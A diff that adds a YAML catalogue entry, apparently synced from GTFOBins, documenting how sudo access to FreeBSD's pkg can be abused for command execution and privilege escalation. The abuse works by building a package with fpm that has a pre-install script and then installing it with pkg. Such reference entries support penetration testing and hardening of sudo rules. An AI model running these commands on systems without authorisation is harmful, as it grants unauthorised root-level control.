@@ -1,0 +1,35 @@
+id: gtfobins/pkg/command/sudo
+type: binary
+platform: linux
+name: pkg
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- command-execution
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: pkg install -y --no-repo-update ./x-1.0.txz
+  comment: 'Generate the FreeBSD package with [fpm](https://github.com/jordansissel/fpm) and upload it
+    to the target.
+
+
+    ```
+
+    echo /path/to/command >x.sh
+
+    fpm -n x -s dir -t freebsd -a all --before-install x.sh .
+
+    ```'
+references:
+- https://gtfobins.github.io/gtfobins/pkg/
+tags:
+- linux
+- unix
+- gtfobins
